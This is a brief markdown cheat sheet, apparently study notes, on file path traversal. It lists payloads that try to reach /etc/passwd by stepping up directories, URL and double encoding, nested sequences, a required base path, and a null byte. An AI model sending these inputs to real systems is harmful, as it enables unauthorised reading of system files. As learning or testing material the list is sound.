## File path traversal, Directory traversal

### Step up multiple levels

On Unix/linux `../`

On Windows both `../` and `..\`

### Absolute path
`/etc/passwd`

### Nested traversal sequences
`....//` or `....\/`

### URL decode or double decode
`..%252f..%252f..%252fetc/passwd`

URL encoding, or even double URL encoding, the `../` characters, resulting in `%2e%2e%2f` or `%252e%252e%252f` respectively. Various non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`, may also do the trick.

### Incude required base path
`/var/www/images/../../../etc/passwd`

### Null byte to terminate stirng
`../../../etc/passwd%00.png`



